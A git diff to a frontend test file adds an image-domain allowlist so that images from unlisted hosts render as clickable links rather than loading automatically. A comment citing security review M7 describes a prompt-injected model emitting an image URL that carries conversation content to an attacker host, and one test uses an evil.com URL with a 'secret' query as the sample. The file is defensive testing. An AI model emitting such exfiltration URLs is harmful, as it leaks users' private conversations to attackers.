@@ -1,8 +1,10 @@
 import { describe, it, expect, vi, afterEach } from 'vitest';
 import { renderNode, safeUrl } from './render';
+import { setImageDomains } from './imagePolicy';
 import type { UiNode } from './api';
 
 afterEach(() => {
+  setImageDomains([]);
   document.body.innerHTML = '';
   vi.useRealTimers();
   vi.unstubAllGlobals();
@@ -55,10 +57,26 @@ describe('renderNode 渲染与 XSS', () => {
   it('image 非法 src 不渲染（返回 null）', () => {
     expect(renderNode({ type: 'image', props: { src: 'javascript:x' } }, noop)).toBeNull();
   });
-  it('image 合法 src 渲染 img 且 src 正确', () => {
+  it('image 域名在白名单内：渲染 img、src 正确且不带 Referer', () => {
+    setImageDomains(['a.com']);
     const el = renderNode({ type: 'image', props: { src: 'https://a.com/x.png', alt: 'a' } }, noop)!;
     expect(el.tagName).toBe('IMG');
     expect((el as HTMLImageElement).getAttribute('src')).toBe('https://a.com/x.png');
+    expect((el as HTMLImageElement).referrerPolicy).toBe('no-referrer');
+  });
+  // 安全审查 M7：模型被提示注入后输出 https://evil/?q=<对话内容> 的图片，自动加载即外带
+  it('image 域名不在白名单：不自动加载，只给可点击链接', () => {
+    setImageDomains(['img.shop.com']);
+    const el = renderNode({ type: 'image', props: { src: 'https://evil.com/x.png?q=secret', alt: '订单' } }, noop)!;
+    expect(el.tagName).toBe('A');
+    expect(el.querySelector('img')).toBeNull();
+    expect((el as HTMLAnchorElement).rel).toContain('noreferrer');
+    expect(el.textContent).toBe('查看图片：订单');
+  });
+  it('image 白名单为空时一律不自动加载', () => {
+    setImageDomains([]);
+    const el = renderNode({ type: 'image', props: { src: 'https://a.com/x.png' } }, noop)!;
+    expect(el.tagName).toBe('A');
   });
   it('card 递归渲染子节点', () => {
     const node: UiNode = { type: 'card', props: { title: '订单' }, children: [
